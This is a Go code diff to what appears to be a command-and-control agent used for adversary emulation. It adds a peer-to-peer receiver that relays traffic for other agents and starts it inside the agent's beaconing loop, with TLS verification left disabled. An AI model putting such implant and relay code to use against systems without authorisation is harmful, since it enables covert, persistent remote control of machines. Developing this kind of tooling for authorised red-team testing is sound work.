@@ -14,6 +14,7 @@ import (
 	"time"
 
 	"../contact"
+	"../proxy"
 	"../executors/execute"
 	"../output"
 	"../privdetect"
@@ -111,8 +112,24 @@ func validC2Configuration(coms contact.Contact, c2Config map[string]string) bool
 	return false
 }
 
+func chooseP2pReceiverChannel(p2pReceiverConfig map[string]string) proxy.P2pReceiver {
+    receiver, _ := proxy.P2pReceiverChannels[p2pReceiverConfig["p2pReceiverType"]]
+
+    if receiver != nil && !validP2pReceiverConfiguration(receiver, p2pReceiverConfig) {
+        output.VerbosePrint("[-] Invalid P2P Receiver configuration. Defaulting to no P2P receiver")
+        receiver = nil
+    }
+
+    return receiver
+}
+
+func validP2pReceiverConfiguration(receiver proxy.P2pReceiver, p2pReceiverConfig map[string]string) bool {
+    receiverLoc, valid := p2pReceiverConfig["p2pReceiver"];
+    return valid && len(receiverLoc) > 0;
+}
+
 //Core is the main function as wrapped by sandcat.go
-func Core(server string, group string, delay int, executors []string, c2 map[string]string, verbose bool) {
+func Core(server string, group string, delay int, executors []string, c2 map[string]string, p2pReceiverConfig map[string]string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	privilege := privdetect.Privlevel()
 	output.SetVerbose(verbose)
@@ -123,11 +140,25 @@ func Core(server string, group string, delay int, executors []string, c2 map[str
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
 
+	p2pReceiverLoc := p2pReceiverConfig["p2pReceiver"]
+	p2pReceiverType := p2pReceiverConfig["p2pReceiverType"]
+
 	profile := buildProfile(server, group, executors, privilege, c2["c2Name"])
 	util.Sleep(float64(delay))
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
+		    // Set up and start p2p receiver if specified, for p2p forwarding.
+		    p2pReceiver := chooseP2pReceiverChannel(p2pReceiverConfig)
+
+		    if p2pReceiver != nil {
+		        output.VerbosePrint(fmt.Sprintf("Starting p2p receiver type %s at %s", p2pReceiverType, p2pReceiverLoc))
+
+		        // This method calls a go subroutine before returning.
+		        p2pReceiver.StartReceiver(profile, p2pReceiverConfig, coms)
+		    }
+
+		    // Run agent
 			for {
 				runAgent(coms, profile)
 			}
